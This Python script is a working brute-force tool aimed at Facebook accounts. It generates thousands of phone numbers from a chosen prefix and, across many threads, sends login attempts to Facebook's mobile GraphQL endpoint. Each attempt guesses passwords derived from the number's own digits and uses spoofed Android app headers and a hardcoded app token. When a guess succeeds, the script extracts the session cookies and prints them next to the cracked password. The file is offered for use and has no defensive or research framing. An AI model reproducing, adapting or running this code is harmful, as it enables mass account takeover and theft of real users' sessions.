import os,json,time,uuid,sys,random,base64,shutil,re, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

line="—"*30
logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻ rnd"""


symbols="  \  ".replace(" ","")




def rn():
    user=[]
    os.system("clear")
    
    limit=30000
    for i in range(limit):
        ga=str(random.choice(range(111111,999999)))
        user.append(ga)
    print(logo)
    print(line)
    print(" CODE : 9848 9946")
    print(line)
    code=input("<~> ")
    print(line)
    pwx=["first6","first8","last6","last8","number"]
    with ThreadPool(max_workers=30) as heron:
        ua="[FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502156;FBDM/{density=1.0,width=1280,height=800};FBLC/fr_FR;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T530;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit))
        print(line)
        for xd in user:
            uid=code+xd
            heron.submit(test_1,uid,pwx,ua)

loop=0
oks=[]


def test_1(uid,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            edata={
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "en_US",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
            "fb_api_caller_class": "graphservice",
            "client_doc_id": "11994080425506443985518532446",
            "variables": "{\"params\": " + json.dumps({
                "params": json.dumps({
                    "client_input_params": {
                        "sim_phones": [],
                        "secure_family_device_id": str(uuid.uuid4()),
                        "attestation_result": {
                            "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiAiWHpONmM5eEE0MmNjMW5mdmFIRk1pQTdzOXFDQzhYd0hLSmZPSnJDWWNrND0iLCAidXNlcm5hbWUiOiAiMTAwMDAyNTY2NjIxNDA5In0=",
                            "signature": "MEUCIQDr7WcJxItusy+bdqDKLyObaZrxduabPGIuNjCyRy1MAwIgbpu6PlPS+frCp+VMlwNcd/YAaExWpQ70GVIU6GBr7Cw=",
                            "keyHash": "c9f1ad106abc6f55de332e615e9895b7d501a5c65bd63b3d697d2521607faad4"
                        },
                        "has_granted_read_contacts_permissions": 0,
                        "auth_secure_device_id": "",
                        "has_whatsapp_installed": 0,
                        "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                        "sso_token_map_json_string": "",
                        "event_flow": "login_manual",
                        "password_contains_non_ascii": "false",
                        "sim_serials": [],
                        "client_known_key_hash": "",
                        "encrypted_msisdn": "",
                        "has_granted_read_phone_permissions": 0,
                        "app_manager_id": "null",
                        "should_show_nested_nta_from_aymh": 0,
                        "device_id": str(uuid.uuid4()),
                        "login_attempt_count": 1,
                        "machine_id": "",
                        "flash_call_permission_status": {
                            "READ_PHONE_STATE": "DENIED",
                            "READ_CALL_LOG": "DENIED",
                            "ANSWER_PHONE_CALLS": "DENIED"},
                        "accounts_list": [],
                        "family_device_id": str(uuid.uuid4()),
                        "fb_ig_device_id": [],
                        "device_emails": [],
                        "try_num": 1,
                        "lois_settings": {"lois_token": ""},
                        "event_step": "home_page",
                        "headers_infra_flow_id": str(uuid.uuid4()),
                        "openid_tokens": {},
                        "contact_point": uid},
                    "server_params": {
                        "should_trigger_override_login_2fa_action": 0,
                        "is_from_logged_out": 0,
                        "should_trigger_override_login_success_action": 0,
                        "login_credential_type": "none",
                        "server_login_source": "login",
                        "waterfall_id": str(uuid.uuid4()),
                        "login_source": "Login",
                        "is_platform_login": 0,
                        "pw_encryption_try_count": 1,
                        "INTERNAL__latency_qpl_marker_id": 36707139,
                        "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                        "is_from_landing_page": 0,
                        "password_text_input_id": "2l8w01:99",
                        "is_from_empty_password": 0,
                        "is_from_msplit_fallback": 0,
                        "ar_event_source": "login_home_page",
                        "username_text_input_id": "2l8w01:98",
                        "layered_homepage_experiment_group": 'null',
                        "device_id": str(uuid.uuid4()),
                        "INTERNAL__latency_qpl_instance_id": 15661900900760.0,
                        "reg_flow_source": "login_home_native_integration_point",
                        "is_caa_perf_enabled": 1,
                        "credential_type": "password",
                        "is_from_password_entry_page": 0,
                        "caller": "gslr",
                        "family_device_id": str(uuid.uuid4()),
                        "is_from_assistive_id": 0,
                        "access_flow_version": "pre_mt_behavior",
                        "is_from_logged_in_switcher": 0
                    }
                }),
                "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
            }) + "}",
            "fb_api_analytics_tags": "[\"GraphServices\"]",
            "client_trace_id": str(uuid.uuid4()),}
            head={
            "user-agent": add_ua+ua,
            "accept-encoding": "gzip, deflate",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "host": "b-graph.facebook.com",
            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "content-type": "application/x-www-form-urlencoded",
            "x-graphql-client-library": "graphservice",
            "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
            "x-tigon-is-retry": "False",
            "x-fb-privacy-context": "3643298472347298",
            "x-graphql-request-purpose": "fetch",
            "x-fb-device-group": str(random.randint(2000,4000)),
            "x-zero-eh": "664c0faaac849cb891d0a261fbb72a12",
            "x-zero-state": "unknown",
            "x-fb-connection-type": "WIFI",
            "x-fb-rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160",
            "x-fb-request-analytics-tags": "{\"network_tags\":{\"product\":\"350685531728\",\"purpose\":\"fetch\",\"request_category\":\"graphql\",\"retry_attempt\":\"0\"},\"application_tags\":\"graphservice\"}",
            "x-fb-http-engine": "Tigon/Liger",
            "x-fb-client-ip": "True",
            "x-fb-server-cluster": "True",
            "Content-Length": "1966"}
            url='https://b-graph.facebook.com/graphql'
            data=str(requests.post(url,data=edata, headers=head).text)
            if "session_key" in data:
                data_coki=data.replace(symbols,"")
                c_user=re.search('"c_user","value":"(.*?)",', str(data_coki)).group(1)
                xs=re.search('"xs","value":"(.*?)",', str(data_coki)).group(1)
                fr=re.search('"fr","value":"(.*?)",', str(data_coki)).group(1)
                datr=re.search('"datr","value":"(.*?)",', str(data_coki)).group(1)
                coki="c_user="+c_user+"; xs="+xs+"; fr="+fr+"; datr="+datr
                xd=c_user
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)




rn()



